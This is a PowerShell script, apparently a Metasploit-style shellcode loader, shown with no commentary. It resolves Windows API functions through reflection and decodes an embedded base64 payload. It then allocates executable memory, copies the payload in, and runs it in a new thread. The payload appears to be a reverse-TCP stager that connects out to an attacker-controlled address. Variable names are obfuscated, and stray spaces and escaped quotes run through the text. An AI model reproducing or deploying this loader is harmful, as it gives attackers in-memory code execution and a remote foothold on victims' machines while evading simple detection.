Start-Sleep -s 1; function aTWP0 { 
	Param ($ c_, $ z6yD)
	$ eo5P8 = ([ AppDomain]:: CurrentDomain.GetAssemblies() | Where-Object { $_. GlobalAssemblyCache -And $_. Location.Split(\'\\\\\')[-1]. Equals(\' System.dll\') }). GetType(\' Microsoft.Win32. UnsafeNativeMethods\') 

	return $ eo5P8. GetMethod(\' GetProcAddress\'). Invoke( $ null, @([ System.Runtime.InteropServices.HandleRef]( New-Object System.Runtime.InteropServices.HandleRef(( New-Object IntPtr), ($ eo5P8. GetMethod(\' GetModuleHandle\')). Invoke( $ null, @( $ c_)))), $ z6yD)) } 
	
	function l4 { 
		Param ( 
			[Parameter( Position = 0, Mandatory = $ True)] [Type[]] $ pT_A, 
			[Parameter( Position = 1)] [Type] $ qP = [Void] 
		)
	$ sB_x = [AppDomain]:: CurrentDomain.DefineDynamicAssembly(( New-Object System.Reflection.AssemblyName(\' ReflectedDelegate\')), [System.Reflection.Emit.AssemblyBuilderAccess]:: Run). DefineDynamicModule(\' InMemoryModule\', $ false). DefineType(\' MyDelegateType\', \' Class, Public, Sealed, AnsiClass, AutoClass\', [System.MulticastDelegate]) $ sB_x.DefineConstructor(\' RTSpecialName, HideBySig, Public\', [System.Reflection.CallingConventions]:: Standard, $ pT_A). SetImplementationFlags(\' Runtime, Managed\')

	$ sB_x.DefineMethod(\' Invoke\', \' Public, HideBySig, NewSlot, Virtual\', $ qP, $ pT_A). SetImplementationFlags(\' Runtime, Managed\') 

	return $ sB_x.CreateType() 
}

[Byte[]] $ jzwzy = [System.Convert]:: FromBase64String("/ OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/ rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/ 6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/ gX19aixLrjV1oMzIAAGh3czJfVGhMdyYHiej/ 0LiQAQAAKcRUUGgpgGsA/ 9VqCmjAqC6BaAIAEVGJ5lBQUFBAUEBQaOoP3 + D/ 1ZdqEFZXaJmldGH/ 1YXAdAz/ Tgh17GjwtaJW/ 9VqAGoEVldoAtnIX// VizZqQGgAEAAAVmoAaFikU + X/ 1ZNTagBWU1doAtnIX// VAcMpxnXuww = =") 

$ i13 = [System.Runtime.InteropServices.Marshal]:: GetDelegateForFunctionPointer(( aTWP0 kernel32. dll VirtualAlloc), (l4 @([ IntPtr], [UInt32], [UInt32], [UInt32]) ([ IntPtr]))). Invoke([ IntPtr]:: Zero, $ jzwzy.Length, 0x3000, 0x40) 
[System.Runtime.InteropServices.Marshal]:: Copy( $ jzwzy, 0, $ i13, $ jzwzy.length) 

$ s9 = [System.Runtime.InteropServices.Marshal]:: GetDelegateForFunctionPointer(( aTWP0 kernel32. dll CreateThread), (l4 @([ IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([ IntPtr]))). Invoke([ IntPtr]:: Zero, 0, $ i13,[ IntPtr]:: Zero, 0,[ IntPtr]:: Zero) [System.Runtime.InteropServices.Marshal]:: GetDelegateForFunctionPointer(( aTWP0 kernel32. dll WaitForSingleObject), (l4 @([ IntPtr], [Int32]))). Invoke( $ s9,0xffffffff) | Out-Null'

